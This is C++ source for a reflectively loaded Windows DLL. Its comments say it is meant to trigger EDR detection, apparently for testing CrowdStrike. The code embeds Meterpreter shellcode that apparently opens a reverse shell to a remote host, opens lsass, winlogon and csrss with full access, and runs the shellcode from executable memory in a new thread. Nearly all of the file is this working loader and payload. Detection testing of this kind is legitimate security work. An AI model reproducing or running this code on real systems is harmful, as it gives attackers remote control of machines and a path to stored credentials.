#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>

// Meterpreter shellcode
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
"\x42\x3c\x48\x01\xd0\x41\x51\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x50\x49"
"\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x38\x6c\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";

// Find process PID by name
DWORD GetProcessPid(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (strcmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

// Get multiple sensitive process PIDs
DWORD GetLsassPid() { return GetProcessPid("lsass.exe"); }
DWORD GetWinlogonPid() { return GetProcessPid("winlogon.exe"); }
DWORD GetCsrssPid() { return GetProcessPid("csrss.exe"); }
DWORD GetSmsPid() { return GetProcessPid("smss.exe"); }

// Execute shellcode in current process safely
void ExecuteShellcode() {
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        ExitThread(0);  // Exit thread, not process
        return;
    }

    // Copy shellcode to executable memory
    memcpy(execMem, shellcode, shellcodeSize);

    // Execute shellcode in a separate thread to avoid killing target process
    HANDLE hShellcodeThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);

    if (hShellcodeThread) {
        // Don't wait for shellcode completion - let it run independently
        // This prevents ExitProcess from being called in main thread
        CloseHandle(hShellcodeThread);
    }

    // Clean exit of our injection thread
    ExitThread(0);
}

// Main payload function - creates VERY suspicious call stack then executes shellcode
extern "C" __declspec(dllexport) void VoidFunc() {
    // This will create the call stack: <unknown> -> kernelbase -> ntdll
    // Multiple suspicious calls from reflectively loaded DLL (unmapped memory)

    // Get PIDs of sensitive processes
    DWORD lsassPid = GetLsassPid();
    DWORD winlogonPid = GetWinlogonPid();
    DWORD csrssPid = GetCsrssPid();
    DWORD smsPid = GetSmsPid();

    // VERY SUSPICIOUS: Multiple OpenProcess calls with PROCESS_ALL_ACCESS
    // These will definitely show up in CrowdStrike as coming from <unknown> memory

    // 1. LSASS access (credential store)
    if (lsassPid != 0) {
        for (int i = 0; i < 3; i++) {
            HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
            if (hLsass) {
                // Try to read memory (more suspicious)
                VirtualQueryEx(hLsass, (LPCVOID)0x400000, NULL, 0);
                CloseHandle(hLsass);
            }
            Sleep(200); // Space out calls for better logging
        }
    }

    // 2. Winlogon access (session management)
    if (winlogonPid != 0) {
        HANDLE hWinlogon = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPid);
        if (hWinlogon) {
            VirtualQueryEx(hWinlogon, (LPCVOID)0x400000, NULL, 0);
            CloseHandle(hWinlogon);
        }
    }

    // 3. CSRSS access (Windows subsystem)
    if (csrssPid != 0) {
        HANDLE hCsrss = OpenProcess(PROCESS_ALL_ACCESS, FALSE, csrssPid);
        if (hCsrss) {
            VirtualQueryEx(hCsrss, (LPCVOID)0x400000, NULL, 0);
            CloseHandle(hCsrss);
        }
    }

    // 4. Additional suspicious calls that EDR watches for
    HANDLE hCurrentProcess = GetCurrentProcess();

    // Enumerate loaded modules (process hollowing indicator)
    HMODULE hModules[1024];
    DWORD cbNeeded;
    EnumProcessModules(hCurrentProcess, hModules, sizeof(hModules), &cbNeeded);

    // Query system information (reconnaissance)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // Memory allocation with execute permissions (shellcode indicator)
    LPVOID testMem = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (testMem) {
        VirtualFree(testMem, 0, MEM_RELEASE);
    }

    Sleep(1000); // Let EDR capture all the suspicious activity

    // Execute the Meterpreter payload
    ExecuteShellcode();

    // This function will never reach here due to ExitThread in ExecuteShellcode
    // But just in case, ensure we exit thread not process
    ExitThread(0);
}

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        // DLL loaded successfully
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}